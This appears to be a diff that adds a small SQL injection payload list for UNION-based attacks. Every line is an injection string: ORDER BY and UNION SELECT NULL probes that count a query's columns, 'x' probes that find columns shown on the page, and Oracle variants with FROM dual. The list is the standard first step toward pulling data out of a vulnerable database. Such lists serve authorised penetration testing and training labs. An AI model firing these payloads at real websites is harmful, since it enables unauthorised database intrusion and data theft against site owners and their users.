@@ -1,0 +1,19 @@
+# Column count via ORDER BY
+' ORDER BY 1-- 
+' ORDER BY 2-- 
+' ORDER BY 3-- 
+
+# Column count via NULLs
+' UNION SELECT NULL-- 
+' UNION SELECT NULL,NULL-- 
+' UNION SELECT NULL,NULL,NULL-- 
+
+# Printable columns (replace one NULL at a time)
+' UNION SELECT 'x',NULL-- 
+' UNION SELECT NULL,'x'-- 
+' UNION SELECT NULL,NULL,'x'-- 
+
+# Oracle adds FROM dual
+' UNION SELECT NULL FROM dual-- 
+' UNION SELECT 'x',NULL FROM dual-- 
+
